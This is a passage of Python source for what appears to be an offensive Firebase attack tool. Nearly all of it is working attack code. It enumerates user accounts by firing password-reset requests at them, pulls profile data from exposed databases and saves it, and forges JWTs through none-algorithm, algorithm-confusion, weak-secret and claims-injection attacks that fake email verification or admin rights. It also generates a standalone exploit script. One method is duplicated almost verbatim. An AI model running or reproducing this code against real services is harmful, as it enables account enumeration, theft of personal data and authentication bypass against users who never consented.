        if self.database_url: # If a specific DB URL is known (e.g. from config extraction)
            db_base_urls.append(self.database_url.rstrip('/') + '/')
        
        # Add common regional patterns based on project ID
        db_base_urls.extend([
            f"https://{self.project_id}-default-rtdb.firebaseio.com/",
            f"https://{self.project_id}.firebaseio.com/", # Legacy
            f"https://{self.project_id}-default-rtdb.europe-west1.firebasedatabase.app/",
            f"https://{self.project_id}-default-rtdb.asia-southeast1.firebasedatabase.app/",
            f"https://{self.project_id}-default-rtdb.us-central1.firebasedatabase.app/",
        ])
        db_base_urls = list(set(db_base_urls)) # Deduplicate

        common_paths = ["users", "profiles", "user_data", "accounts", "userProfiles"]
        
        email_local_part = email.split('@')[0] if '@' in email else email
        normalized_email_for_key = re.sub(r'[.#$\[\]]', '_', email)

        for db_url_base in db_base_urls:
            for user_path in common_paths:
                # Try with email local part as key
                path_to_try_local = f"{db_url_base.rstrip('/')}/{user_path}/{email_local_part}.json"
                # Try with normalized full email as key
                path_to_try_normalized = f"{db_url_base.rstrip('/')}/{user_path}/{normalized_email_for_key}.json"

                for lookup_path in [path_to_try_local, path_to_try_normalized]:
                    try:
                        # print(f"{Colors.CYAN}[i] DB Check: Trying {lookup_path} for {email}{Colors.ENDC}")
                        response = self.session.get(lookup_path, timeout=3) # Short timeout for these checks
                        if response.status_code == 200:
                            content = response.text
                            if content and content.strip().lower() != 'null' and len(content.strip()) > 2:
                                try:
                                    profile_data = response.json()
                                    if isinstance(profile_data, dict): # Ensure it's a JSON object
                                        print(f"{Colors.GREEN}[✓] Found potential profile for {email} in open DB at {lookup_path}{Colors.ENDC}")
                                        return profile_data
                                except json.JSONDecodeError:
                                    # Not valid JSON, but still an exposure if content is meaningful
                                    print(f"{Colors.WARNING}[!] Non-JSON data found for {email} at {lookup_path}. Exposure, but cannot parse profile.{Colors.ENDC}")
                                    return {"exposed_data_path": lookup_path, "raw_content_snippet": content[:100]} 
                    except requests.exceptions.Timeout:
                        # print(f"{Colors.YELLOW}[!] Timeout checking DB path: {lookup_path}{Colors.ENDC}")
                        continue
                    except requests.exceptions.RequestException:
                        # print(f"{Colors.YELLOW}[!] Error checking DB path: {lookup_path}{Colors.ENDC}")
                        continue
        return None

    def _fetch_profile_from_open_databases(self, email: str) -> Optional[Dict]:
        """Attempt to fetch a user's profile from commonly exposed database paths using their email."""
        if not self.project_id:
            # print(f"{Colors.YELLOW}[i] Project ID not set, cannot reliably check databases for {email}.{Colors.ENDC}")
            return None

        db_base_urls = []
        if self.database_url: # If a specific DB URL is known (e.g. from config extraction)
            db_base_urls.append(self.database_url.rstrip('/') + '/')
        
        # Add common regional patterns based on project ID
        # Ensure project_id is not None before using it in f-strings
        if self.project_id:
            db_base_urls.extend([
                f"https://{self.project_id}-default-rtdb.firebaseio.com/",
                f"https://{self.project_id}.firebaseio.com/", # Legacy
                f"https://{self.project_id}-default-rtdb.europe-west1.firebasedatabase.app/",
                f"https://{self.project_id}-default-rtdb.asia-southeast1.firebasedatabase.app/",
                f"https://{self.project_id}-default-rtdb.us-central1.firebasedatabase.app/",
            ])
        db_base_urls = list(set(db_base_urls)) # Deduplicate

        common_paths = ["users", "profiles", "user_data", "accounts", "userProfiles"]
        
        email_local_part = email.split('@')[0] if '@' in email else email
        # Firebase keys cannot contain '.', '#', '$', '[', or ']'
        normalized_email_for_key = re.sub(r'[.#$\[\]]', '_', email)

        for db_url_base in db_base_urls:
            for user_path in common_paths:
                # Try with email local part as key
                path_to_try_local = f"{db_url_base.rstrip('/')}/{user_path}/{email_local_part}.json"
                # Try with normalized full email as key
                path_to_try_normalized = f"{db_url_base.rstrip('/')}/{user_path}/{normalized_email_for_key}.json"

                for lookup_path in [path_to_try_local, path_to_try_normalized]:
                    try:
                        # print(f"{Colors.CYAN}[i] DB Check: Trying {lookup_path} for {email}{Colors.ENDC}")
                        response = self.session.get(lookup_path, timeout=3) # Short timeout for these checks
                        if response.status_code == 200:
                            content = response.text
                            if content and content.strip().lower() != 'null' and len(content.strip()) > 2:
                                try:
                                    profile_data = response.json()
                                    if isinstance(profile_data, dict): # Ensure it's a JSON object
                                        print(f"{Colors.GREEN}[✓] Found potential profile for {email} in open DB at {lookup_path}{Colors.ENDC}")
                                        return profile_data
                                except json.JSONDecodeError:
                                    # Not valid JSON, but still an exposure if content is meaningful
                                    print(f"{Colors.WARNING}[!] Non-JSON data found for {email} at {lookup_path}. Exposure, but cannot parse profile.{Colors.ENDC}")
                                    return {"exposed_data_path": lookup_path, "raw_content_snippet": content[:100]} 
                    except requests.exceptions.Timeout:
                        # print(f"{Colors.YELLOW}[!] Timeout checking DB path: {lookup_path}{Colors.ENDC}")
                        continue
                    except requests.exceptions.RequestException:
                        # print(f"{Colors.YELLOW}[!] Error checking DB path: {lookup_path}{Colors.ENDC}")
                        continue
        return None

    def _enumerate_common_emails(self, api_key: str, custom_emails: Optional[List[str]] = None, email_file_path: Optional[str] = None, single_email: Optional[str] = None) -> List[Dict]:
            """Enumerate email patterns to find existing users, with options for custom inputs."""
            print(f"\n{Colors.CYAN}[*] Enumerating Email Patterns...{Colors.ENDC}")
            
            users = [] # Initialize users list
            emails_to_check_set = set()
            
            if single_email:
                if "@" in single_email: # Basic validation
                    emails_to_check_set.add(single_email)
                    print(f"{Colors.CYAN}[*] Testing single email: {single_email}{Colors.ENDC}")
                else:
                    print(f"{Colors.WARNING}[!] Invalid single email provided: {single_email}. Skipping.{Colors.ENDC}")
                    return users 
            else:
                # Populate with default common emails
                default_domains = ['gmail.com', 'hotmail.com', 'yahoo.com', 'outlook.com']
                if self.project_id:
                    default_domains.append(f'{self.project_id}.com')
                default_usernames = ['admin', 'administrator', 'test', 'user', 'support', 'info', 'contact', 'root', 'demo']
                
                for domain in default_domains:
                    for username in default_usernames:
                        emails_to_check_set.add(f"{username}@{domain}")
                
                if self.project_id:
                    project_specific_emails = [
                        f"admin@{self.project_id}.com",
                        f"support@{self.project_id}.com",
                        f"test@{self.project_id}.com"
                    ]
                    emails_to_check_set.update(project_specific_emails)

                # Add custom_emails list if provided
                if custom_emails:
                    for email_item in custom_emails: # changed email to email_item to avoid conflict with outer scope 'email'
                        if "@" in email_item: # Basic validation
                            emails_to_check_set.add(email_item)
                        else:
                            print(f"{Colors.WARNING}[!] Invalid email in custom list: {email_item}{Colors.ENDC}")
                
                # Process email_file_path if provided
                if email_file_path:
                    try:
                        with open(email_file_path, 'r') as f:
                            count_before = len(emails_to_check_set)
                            for line in f:
                                email_from_file = line.strip()
                                if "@" in email_from_file: # Basic validation
                                    emails_to_check_set.add(email_from_file)
                                elif email_from_file: 
                                    print(f"{Colors.WARNING}[!] Invalid email in file '{email_file_path}': {email_from_file}{Colors.ENDC}")
                        print(f"{Colors.GREEN}[✓] Added {len(emails_to_check_set) - count_before} unique emails from: {email_file_path}{Colors.ENDC}")
                    except FileNotFoundError:
                        print(f"{Colors.FAIL}[!] Email file not found: {email_file_path}{Colors.ENDC}")
                    except IOError as e:
                        print(f"{Colors.FAIL}[!] Error reading email file '{email_file_path}': {e}{Colors.ENDC}")
                
                if not custom_emails and not email_file_path: # Only default
                     print(f"{Colors.CYAN}[*] Testing {len(emails_to_check_set)} default common email patterns...{Colors.ENDC}")
                else: # Some custom input was given along with defaults
                    print(f"{Colors.CYAN}[*] Testing a total of {len(emails_to_check_set)} unique emails (including defaults, custom list, and/or file).{Colors.ENDC}")

            final_emails_to_check = list(emails_to_check_set)
            
            if not final_emails_to_check:
                print(f"{Colors.WARNING}[!] No valid emails to enumerate.{Colors.ENDC}")
                return users
            
            reset_endpoint = f"https://identitytoolkit.googleapis.com/v1/accounts:sendOobCode?key={api_key}"
            
            for email in final_emails_to_check:
                try:
                    reset_data = {
                        "requestType": "PASSWORD_RESET",
                        "email": email
                    }
                    
                    response = self.session.post(reset_endpoint, json=reset_data, timeout=5)
                    
                    user_save_data = None # Changed from user_entry to user_save_data for clarity
                    current_timestamp = int(time.time())
                    normalized_email_filename = re.sub(r'[^a-zA-Z0-9]', '_', email)
                    filename_base = f"firebase_enum_user_{normalized_email_filename}_{current_timestamp}.json"
                    auth_check_status = "unknown"
                    print_msg = ""

                    if response.status_code == 200:
                        auth_check_status = "exists_reset_sent"
                        print_msg = f"{Colors.GREEN}[+] Found via auth: {email} (reset sent)."
                        
                    elif response.status_code == 400:
                        error_data = response.json()
                        error_msg = error_data.get('error', {}).get('message', '')
                        
                        if 'EMAIL_NOT_FOUND' in error_msg:
                            continue # Email does not exist, skip to next
                        elif 'RESET_PASSWORD_EXCEED_LIMIT' in error_msg:
                            auth_check_status = "exists_rate_limited"
                            print_msg = f"{Colors.GREEN}[+] Found via auth: {email} (rate limited)."
                        elif 'TOO_MANY_ATTEMPTS_TRY_LATER' in error_msg:
                            print(f"{Colors.WARNING}[!] Rate limited for {email} during auth check, pausing...{Colors.ENDC}")
                            time.sleep(5) 
                            continue 
                        else: 
                            print(f"{Colors.YELLOW}[?] Unknown 400 error for {email} during auth check: {error_msg}{Colors.ENDC}")
                            continue
                    else: # Other HTTP status codes for auth check
                        print(f"{Colors.YELLOW}[?] Unexpected status {response.status_code} for {email} during auth check.{Colors.ENDC}")
                        continue 
                    
                    # If email existence is confirmed by any of the above positive statuses
                    user_save_data = {
                        'email': email,
                        'project_id': self.project_id if self.project_id else "N/A",
                        'api_key_used': self.api_key[:10] + "..." if self.api_key else "N/A",
                        'timestamp': current_timestamp,
                        'existence_confirmed_by': "email_enumeration_password_reset",
                        'auth_check_status': auth_check_status,
                        'database_profile': None # Initialize
                    }
                    
                    # Attempt to fetch profile from open databases
                    database_profile = self._fetch_profile_from_open_databases(email)
                    if database_profile:
                        user_save_data["database_profile"] = database_profile
                        print_msg += f" {Colors.GREEN}Additional profile data found in open DB!{Colors.ENDC}"
                    else:
                        print_msg += f" {Colors.YELLOW}No additional profile data in open DB.{Colors.ENDC}"
                    
                    print(print_msg + f" Data saved to {filename_base}")
                    
                    users.append(user_save_data)
                    try:
                        with open(filename_base, 'w') as f_out:
                            json.dump(user_save_data, f_out, indent=2)
                    except IOError as e:
                        print(f"{Colors.FAIL}[!] Error saving data for {email} to {filename_base}: {e}{Colors.ENDC}")
                            
                except requests.exceptions.RequestException as e:
                    print(f"{Colors.FAIL}[!] Request error for {email}: {e}{Colors.ENDC}")
                    continue 
                    
                # Small delay to avoid aggressive rate limiting
                time.sleep(0.3)
            
            return users

    def _generate_jwt_exploit_script(self, successful_attacks: List[Dict], analysis: Dict) -> None:
        """Generate JWT exploitation script"""
        print(f"\n{Colors.CYAN}[*] Generating JWT Exploitation Script{Colors.ENDC}")
        
        script_content = f'''#!/usr/bin/env python3
"""
Firebase JWT Exploitation Script
Generated by Firebase Scanner Enhanced
Target: {self.project_id}
"""

import base64
import json
import hmac
import hashlib
import requests
import sys

class FirebaseJWTExploit:
    def __init__(self, api_key):
        self.api_key = api_key
        self.session = requests.Session()
    
    def manipulate_jwt_email_verification(self, original_token):
        """Main JWT manipulation for email verification bypass"""
        try:
            # Parse original token
            parts = original_token.split('.')
            if len(parts) != 3:
                return None
            
            # Decode payload
            payload_padding = '=' * (4 - len(parts[1]) % 4)
            payload_data = base64.urlsafe_b64decode(parts[1] + payload_padding)
            payload = json.loads(payload_data)
            
            print(f"[*] Original email_verified: {{payload.get('email_verified', False)}}")
'''
        
        # Add specific attack methods based on successful attacks
        for attack in successful_attacks:
            attack_name = attack['attack'].lower().replace(' ', '_')
            
            if 'algorithm confusion' in attack_name:
                script_content += '''
    def algorithm_confusion_attack(self, token):
        """Algorithm Confusion Attack: RS256 -> HS256"""
        parts = token.split('.')
        
        # Decode header and payload
        header_padding = '=' * (4 - len(parts[0]) % 4)
        header_data = base64.urlsafe_b64decode(parts[0] + header_padding)
        header = json.loads(header_data)
        
        payload_padding = '=' * (4 - len(parts[1]) % 4)
        payload_data = base64.urlsafe_b64decode(parts[1] + payload_padding)
        payload = json.loads(payload_data)
        
        # Modify header algorithm
        header['alg'] = 'HS256'
        payload['email_verified'] = True
        
        # Get Firebase public key
        public_key = self.get_firebase_public_key(header.get('kid'))
        if not public_key:
            return None
            
        return self.create_hmac_token(header, payload, public_key)
'''
            
            elif 'none algorithm' in attack_name:
                script_content += '''
    def none_algorithm_attack(self, token):
        """None Algorithm Attack"""
        parts = token.split('.')
        
        # Decode and modify
        header_padding = '=' * (4 - len(parts[0]) % 4)
        header_data = base64.urlsafe_b64decode(parts[0] + header_padding)
        header = json.loads(header_data)
        
        payload_padding = '=' * (4 - len(parts[1]) % 4)
        payload_data = base64.urlsafe_b64decode(parts[1] + payload_padding)
        payload = json.loads(payload_data)
        
        # Modify to none algorithm
        header['alg'] = 'none'
        payload['email_verified'] = True
        
        # Create token with no signature
        header_encoded = base64.urlsafe_b64encode(
            json.dumps(header, separators=(',', ':')).encode()
        ).decode().rstrip('=')
        
        payload_encoded = base64.urlsafe_b64encode(
            json.dumps(payload, separators=(',', ':')).encode()
        ).decode().rstrip('=')
        
        return f"{header_encoded}.{payload_encoded}."
'''
            
            elif 'weak secret' in attack_name:
                script_content += f'''
    def weak_secret_attack(self, token):
        """Weak Secret Bruteforce Attack"""
        # Try the discovered weak secret: {attack['result'].get('secret', 'unknown')}
        weak_secret = "{attack['result'].get('secret', 'secret')}"
        
        parts = token.split('.')
        header_payload = f"{{parts[0]}}.{{parts[1]}}"
        
        # Decode payload and modify
        payload_padding = '=' * (4 - len(parts[1]) % 4)
        payload_data = base64.urlsafe_b64decode(parts[1] + payload_padding)
        payload = json.loads(payload_data)
        payload['email_verified'] = True
        
        # Re-encode payload
        payload_encoded = base64.urlsafe_b64encode(
            json.dumps(payload, separators=(',', ':')).encode()
        ).decode().rstrip('=')
        
        # Create new signature
        new_message = f"{{parts[0]}}.{{payload_encoded}}"
        signature = hmac.new(
            weak_secret.encode(),
            new_message.encode(),
            hashlib.sha256
        ).digest()
        
        signature_encoded = base64.urlsafe_b64encode(signature).decode().rstrip('=')
        
        return f"{{parts[0]}}.{{payload_encoded}}.{{signature_encoded}}"
'''

        script_content += '''
    def get_firebase_public_key(self, key_id):
        """Get Firebase public key for algorithm confusion"""
        try:
            keys_url = "https://www.googleapis.com/robot/v1/metadata/x509/securetoken@system.gserviceaccount.com"
            response = self.session.get(keys_url, timeout=10)
            
            if response.status_code == 200:
                keys = response.json()
                return keys.get(key_id, '')
            
        except:
            pass
        return None
    
    def create_hmac_token(self, header, payload, secret):
        """Create HMAC-signed token"""
        try:
            header_encoded = base64.urlsafe_b64encode(
                json.dumps(header, separators=(',', ':')).encode()
            ).decode().rstrip('=')
            
            payload_encoded = base64.urlsafe_b64encode(
                json.dumps(payload, separators=(',', ':')).encode()
            ).decode().rstrip('=')
            
            message = f"{header_encoded}.{payload_encoded}"
            signature = hmac.new(
                secret.encode(),
                message.encode(),
                hashlib.sha256
            ).digest()
            
            signature_encoded = base64.urlsafe_b64encode(signature).decode().rstrip('=')
            
            return f"{header_encoded}.{payload_encoded}.{signature_encoded}"
            
        except Exception as e:
            print(f"Error creating HMAC token: {e}")
            return None
    
    def test_token(self, token):
        """Test if manipulated token works"""
        try:
            lookup_endpoint = f"https://identitytoolkit.googleapis.com/v1/accounts:lookup?key={self.api_key}"
            
            response = self.session.post(
                lookup_endpoint,
                json={"idToken": token},
                timeout=10
            )
            
            if response.status_code == 200:
                user_data = response.json()
                users = user_data.get('users', [])
                
                if users:
                    user = users[0]
                    print(f"[+] Token accepted!")
                    print(f"    Email: {user.get('email', 'Unknown')}")
                    print(f"    Email Verified: {user.get('emailVerified', False)}")
                    print(f"    User ID: {user.get('localId', 'Unknown')}")
                    
                    if user.get('emailVerified'):
                        print("🚨 EMAIL VERIFICATION BYPASS SUCCESSFUL! 🚨")
                        return True
            else:
                print(f"[-] Token rejected: {response.status_code}")
                
        except Exception as e:
            print(f"Error testing token: {e}")
            
        return False

def main():
    if len(sys.argv) < 3:
        print("Usage: python3 jwt_exploit.py <original_token> <api_key>")
        print("       python3 jwt_exploit.py <original_token> <api_key> <attack_method>")
        print("")
        print("Attack methods:")'''
        
        # Add attack methods to usage
        for attack in successful_attacks:
            method_name = attack['attack'].lower().replace(' ', '_').replace('-', '_')
            script_content += f'''
        print("  {method_name}")'''
        
        script_content += '''
        return
    
    original_token = sys.argv[1]
    api_key = sys.argv[2]
    attack_method = sys.argv[3] if len(sys.argv) > 3 else None
    
    exploit = FirebaseJWTExploit(api_key)
    
    print("Firebase JWT Exploitation Tool")
    print("=" * 40)
    print(f"Target token: {original_token[:50]}...")
    print("")
    
    # Try all available attacks or specific one
    attacks_to_try = []
    '''
        
        # Add attack method calls
        for attack in successful_attacks:
            method_name = attack['attack'].lower().replace(' ', '_').replace('-', '_')
            script_content += f'''
    if not attack_method or attack_method == "{method_name}":
        attacks_to_try.append(("{attack['attack']}", exploit.{method_name}))'''
        
        script_content += '''
    
    success = False
    for attack_name, attack_func in attacks_to_try:
        print(f"[*] Trying {attack_name}...")
        
        try:
            manipulated_token = attack_func(original_token)
            
            if manipulated_token:
                print(f"[+] Generated manipulated token")
                print(f"    Token: {manipulated_token[:50]}...")
                
                if exploit.test_token(manipulated_token):
                    print(f"[+] SUCCESS: {attack_name} worked!")
                    
                    # Save successful token
                    with open(f"successful_jwt_{int(time.time())}.txt", "w") as f:
                        f.write(f"Attack: {attack_name}\\n")
                        f.write(f"Original: {original_token}\\n")
                        f.write(f"Manipulated: {manipulated_token}\\n")
                    
                    success = True
                    break
                else:
                    print(f"[-] Token generated but not accepted")
            else:
                print(f"[-] Could not generate token for {attack_name}")
                
        except Exception as e:
            print(f"[!] Error in {attack_name}: {e}")
    
    if not success:
        print("[-] No JWT attacks were successful")
    
if __name__ == "__main__":
    main()
'''
        
        # Save the script
        timestamp = int(time.time())
        script_filename = f"firebase_jwt_exploit_{timestamp}.py"
        
        try:
            with open(script_filename, 'w') as f:
                f.write(script_content)
            
            # Make executable
            import stat
            st = os.stat(script_filename)
            os.chmod(script_filename, st.st_mode | stat.S_IEXEC)
            
            print(f"{Colors.GREEN}[✓] JWT exploitation script generated: {script_filename}{Colors.ENDC}")
            print(f"\n{Colors.CYAN}Usage examples:{Colors.ENDC}")
            print(f"  python3 {script_filename} <your_jwt_token> <api_key>")
            print(f"  python3 {script_filename} <your_jwt_token> <api_key> none_algorithm_attack")
            
        except Exception as e:
            print(f"{Colors.FAIL}[!] Error generating JWT script: {e}{Colors.ENDC}")

    def _display_jwt_attack_summary(self, successful_attacks: List[Dict], original_token: str, analysis: Dict) -> None:
        """Display summary of JWT attacks"""
        print(f"\n{Colors.CYAN}╔══════════════════════════════════════════╗")
        print(f"║           JWT ATTACK SUMMARY             ║")
        print(f"╚══════════════════════════════════════════╝{Colors.ENDC}")
        
        if not successful_attacks:
            print(f"\n{Colors.GREEN}[✓] No JWT vulnerabilities found - Token appears secure{Colors.ENDC}")
            return
        
        print(f"\n{Colors.FAIL}🚨 JWT VULNERABILITIES FOUND! 🚨{Colors.ENDC}")
        print(f"Successful attacks: {len(successful_attacks)}")
        
        for attack in successful_attacks:
            print(f"\n{Colors.FAIL}[+] {attack['attack']}{Colors.ENDC}")
            print(f"    Details: {attack['result'].get('details', 'No details')}")
            
            if attack['result'].get('manipulated_token'):
                token_preview = attack['result']['manipulated_token'][:50] + '...'
                print(f"    Token: {token_preview}")
        
        # Save JWT attack results
        timestamp = int(time.time())
        results_file = f"jwt_attacks_{timestamp}.json"
        
        results_data = {
            'timestamp': timestamp,
            'original_token_analysis': analysis,
            'successful_attacks': successful_attacks,
            'total_attacks_tested': len(successful_attacks) + 5,  # Approximate
            'recommendations': [
                'Use RS256 algorithm with proper key management',
                'Implement proper signature verification',
                'Validate all JWT claims server-side',
                'Use short token lifetimes',
                'Implement token blacklisting'
            ]
        }
        
        with open(results_file, 'w') as f:
            json.dump(results_data, f, indent=2)
        
        print(f"\n{Colors.GREEN}[✓] JWT attack results saved to: {results_file}{Colors.ENDC}")
        
        # Generate exploitation script for successful attacks
        if successful_attacks:
            self._generate_jwt_exploit_script(successful_attacks, analysis)

    def _test_manipulated_token(self, token: str, api_key: str) -> None:
        """Test what can be done with manipulated token"""
        print(f"\n{Colors.CYAN}[*] Testing Manipulated Token Capabilities{Colors.ENDC}")
        
        # Test profile access
        try:
            lookup_endpoint = f"https://identitytoolkit.googleapis.com/v1/accounts:lookup?key={api_key}"
            response = self.session.post(lookup_endpoint, json={"idToken": token}, timeout=5)
            
            if response.status_code == 200:
                user_data = response.json()
                users = user_data.get('users', [])
                
                if users:
                    user = users[0]
                    print(f"{Colors.GREEN}[+] Token accepted! User profile accessible:{Colors.ENDC}")
                    print(f"    Email: {user.get('email', 'Unknown')}")
                    print(f"    Email Verified: {user.get('emailVerified', False)}")
                    print(f"    User ID: {user.get('localId', 'Unknown')}")
                    
                    if user.get('emailVerified'):
                        print(f"{Colors.FAIL}🚨 EMAIL VERIFICATION BYPASS SUCCESSFUL! 🚨{Colors.ENDC}")
            else:
                print(f"{Colors.FAIL}[-] Token rejected: {response.status_code}{Colors.ENDC}")
                
        except Exception as e:
            print(f"{Colors.FAIL}[!] Error testing token: {e}{Colors.ENDC}")

    def _quick_token_test(self, token: str, api_key: str) -> bool:
        """Quick test to see if manipulated token is accepted"""
        try:
            lookup_endpoint = f"https://identitytoolkit.googleapis.com/v1/accounts:lookup?key={api_key}"
            
            response = self.session.post(
                lookup_endpoint,
                json={"idToken": token},
                timeout=5
            )
            
            return response.status_code == 200
            
        except Exception as e:
            return False

    def _get_firebase_public_key(self, key_id: str) -> Optional[str]:
        """Attempt to retrieve Firebase public key"""
        try:
            # Firebase public keys endpoint
            keys_url = "https://www.googleapis.com/robot/v1/metadata/x509/securetoken@system.gserviceaccount.com"
            response = self.session.get(keys_url, timeout=10)
            
            if response.status_code == 200:
                keys = response.json()
                return keys.get(key_id)
            
        except Exception as e:
            pass
        
        return None

    def _test_weak_secret_bruteforce(self, token: str, analysis: Dict, api_key: str, email: str) -> Dict:
        """Test weak secret bruteforce for HMAC tokens"""
        if not analysis['algorithm'].startswith('HS'):
            return {'success': False, 'error': 'Not an HMAC token'}
        
        try:
            import base64
            import json
            import hmac
            import hashlib
            
            # Common weak secrets to try
            weak_secrets = [
                'secret', 'password', '123456', 'firebase', 'key',
                self.project_id, f'{self.project_id}_secret', 
                'firebase_secret', 'jwt_secret', 'your_secret_key',
                '', 'null', 'undefined', 'secret123', 'password123',
                analysis.get('key_id', ''), analysis.get('issuer', '').split('/')[-1]
            ]
            
            # Get the signing input
            header_payload = f"{analysis['raw_parts'][0]}.{analysis['raw_parts'][1]}"
            original_signature = base64.urlsafe_b64decode(
                analysis['raw_parts'][2] + '=' * (4 - len(analysis['raw_parts'][2]) % 4)
            )
            
            # Try each weak secret
            for secret in weak_secrets:
                try:
                    if analysis['algorithm'] == 'HS256':
                        calculated_sig = hmac.new(
                            secret.encode(),
                            header_payload.encode(),
                            hashlib.sha256
                        ).digest()
                    elif analysis['algorithm'] == 'HS512':
                        calculated_sig = hmac.new(
                            secret.encode(),
                            header_payload.encode(),
                            hashlib.sha512
                        ).digest()
                    else:
                        continue
                    
                    if calculated_sig == original_signature:
                        # Found the secret! Now create manipulated token
                        modified_payload = analysis['payload'].copy()
                        modified_payload['email_verified'] = True
                        
                        payload_encoded = base64.urlsafe_b64encode(
                            json.dumps(modified_payload, separators=(',', ':')).encode()
                        ).decode().rstrip('=')
                        
                        new_message = f"{analysis['raw_parts'][0]}.{payload_encoded}"
                        new_signature = hmac.new(
                            secret.encode(),
                            new_message.encode(),
                            hashlib.sha256 if analysis['algorithm'] == 'HS256' else hashlib.sha512
                        ).digest()
                        
                        new_signature_encoded = base64.urlsafe_b64encode(new_signature).decode().rstrip('=')
                        manipulated_token = f"{analysis['raw_parts'][0]}.{payload_encoded}.{new_signature_encoded}"
                        
                        return {
                            'success': True,
                            'details': f'Weak secret found: "{secret}"',
                            'manipulated_token': manipulated_token,
                            'secret': secret,
                            'algorithm': analysis['algorithm']
                        }
                        
                except Exception as e:
                    continue
            
            return {'success': False, 'error': 'No weak secrets found'}
            
        except Exception as e:
            return {'success': False, 'error': f'Weak secret bruteforce failed: {e}'}

    def _test_direct_payload_modification(self, token: str, analysis: Dict, api_key: str) -> Dict:
        """Test direct payload modification without signature verification"""
        try:
            import base64
            import json
            
            # Create various payload modifications
            modifications = [
                # Basic email verification bypass
                {'email_verified': True},
                
                # Admin role injection
                {'email_verified': True, 'admin': True, 'role': 'admin'},
                
                # Custom claims injection
                {'email_verified': True, 'custom_claims': {'admin': True, 'verified': True}},
                
                # Firebase-specific claims
                {'email_verified': True, 'firebase': {'sign_in_provider': 'google.com'}},
                
                # Authority escalation
                {'email_verified': True, 'iss': f'https://securetoken.google.com/{self.project_id}', 'admin': True},
            ]
            
            successful_modifications = []
            
            for mod in modifications:
                try:
                    modified_payload = analysis['payload'].copy()
                    modified_payload.update(mod)
                    
                    payload_encoded = base64.urlsafe_b64encode(
                        json.dumps(modified_payload, separators=(',', ':')).encode()
                    ).decode().rstrip('=')
                    
                    # Try with original signature
                    manipulated_token = f"{analysis['raw_parts'][0]}.{payload_encoded}.{analysis['raw_parts'][2]}"
                    
                    # Quick test
                    if self._quick_token_test(manipulated_token, api_key):
                        successful_modifications.append({
                            'modification': mod,
                            'token': manipulated_token
                        })
                        
                except Exception as e:
                    continue
            
            if successful_modifications:
                return {
                    'success': True,
                    'details': f'Payload modification successful: {len(successful_modifications)} variants work',
                    'modifications': successful_modifications,
                    'manipulated_token': successful_modifications[0]['token']
                }
            else:
                return {'success': False, 'error': 'Payload modification did not work'}
                
        except Exception as e:
            return {'success': False, 'error': f'Payload modification failed: {e}'}

    def _test_claims_manipulation(self, token: str, analysis: Dict, api_key: str, email: str) -> Dict:
        """Test direct claims manipulation with original signature"""
        try:
            import base64
            import json
            
            # Create multiple variations of manipulated claims
            manipulations = [
                {'email_verified': True},
                {'email_verified': True, 'admin': True},
                {'email_verified': True, 'role': 'admin'},
                {'verified': True, 'email_verified': True},
                {'email_verified': 'true'},  # String instead of boolean
                {'email_verified': 1},       # Number instead of boolean
            ]
            
            for manipulation in manipulations:
                modified_payload = analysis['payload'].copy()
                modified_payload.update(manipulation)
                
                payload_encoded = base64.urlsafe_b64encode(
                    json.dumps(modified_payload, separators=(',', ':')).encode()
                ).decode().rstrip('=')
                
                # Keep original header and signature
                manipulated_token = f"{analysis['raw_parts'][0]}.{payload_encoded}.{analysis['raw_parts'][2]}"
                
                # Test this token quickly
                test_result = self._quick_token_test(manipulated_token, api_key)
                if test_result:
                    return {
                        'success': True,
                        'details': f'Claims manipulation successful: {manipulation}',
                        'manipulated_token': manipulated_token,
                        'manipulation': manipulation
                    }
            
            return {'success': False, 'error': 'No claims manipulation succeeded'}
            
        except Exception as e:
            return {'success': False, 'error': f'Claims manipulation failed: {e}'}

    def _test_signature_stripping(self, token: str, analysis: Dict, api_key: str, email: str) -> Dict:
        """Test signature stripping attack"""
        try:
            import base64
            import json
            
            # Try removing signature entirely
            parts = analysis['raw_parts']
            
            # Test 1: Empty signature
            modified_payload = analysis['payload'].copy()
            modified_payload['email_verified'] = True
            
            payload_encoded = base64.urlsafe_b64encode(
                json.dumps(modified_payload, separators=(',', ':')).encode()
            ).decode().rstrip('=')
            
            # Try with empty signature
            manipulated_token = f"{parts[0]}.{payload_encoded}."
            
            return {
                'success': True,
                'details': 'Signature stripping - Empty signature',
                'manipulated_token': manipulated_token,
                'attack_type': 'signature_stripping'
            }
            
        except Exception as e:
            return {'success': False, 'error': f'Signature stripping failed: {e}'}

    def _test_none_algorithm(self, token: str, analysis: Dict, api_key: str, email: str) -> Dict:
        """Test 'none' algorithm attack"""
        try:
            import base64
            import json
            
            # Modify header to use 'none' algorithm
            modified_header = analysis['header'].copy()
            modified_header['alg'] = 'none'
            
            # Modify payload to set email_verified = true
            modified_payload = analysis['payload'].copy()
            modified_payload['email_verified'] = True
            
            # Encode modified parts
            header_encoded = base64.urlsafe_b64encode(
                json.dumps(modified_header, separators=(',', ':')).encode()
            ).decode().rstrip('=')
            
            payload_encoded = base64.urlsafe_b64encode(
                json.dumps(modified_payload, separators=(',', ':')).encode()
            ).decode().rstrip('=')
            
            # No signature for 'none' algorithm
            manipulated_token = f"{header_encoded}.{payload_encoded}."
            
            return {
                'success': True,
                'details': "Algorithm 'none' attack - No signature verification",
                'manipulated_token': manipulated_token,
                'attack_type': 'none_algorithm'
            }
            
        except Exception as e:
            return {'success': False, 'error': f'None algorithm attack failed: {e}'}

    def _test_algorithm_confusion(self, token: str, analysis: Dict, api_key: str, email: str) -> Dict:
        """Test algorithm confusion attacks (RS256 -> HS256)"""
        if analysis['algorithm'] != 'RS256':
            return {'success': False, 'error': 'Token not using RS256'}
        
        try:
            import base64
            import json
            import hmac
            import hashlib
            
            # Try to get Firebase's public key and use it as HMAC secret
            public_key = self._get_firebase_public_key(analysis.get('key_id'))
            if not public_key:
                return {'success': False, 'error': 'Could not retrieve public key'}
            
            # Modify header to use HS256
            modified_header = analysis['header'].copy()
            modified_header['alg'] = 'HS256'
            
            # Modify payload to set email_verified = true
            modified_payload = analysis['payload'].copy()
            modified_payload['email_verified'] = True
            
            # Encode modified parts
            header_encoded = base64.urlsafe_b64encode(
                json.dumps(modified_header, separators=(',', ':')).encode()
            ).decode().rstrip('=')
            
            payload_encoded = base64.urlsafe_b64encode(
                json.dumps(modified_payload, separators=(',', ':')).encode()
            ).decode().rstrip('=')
            
            # Create signature using public key as HMAC secret
            message = f"{header_encoded}.{payload_encoded}"
            signature = hmac.new(
                public_key.encode(),
                message.encode(),
                hashlib.sha256
            ).digest()
            
            signature_encoded = base64.urlsafe_b64encode(signature).decode().rstrip('=')
            
            # Create manipulated token
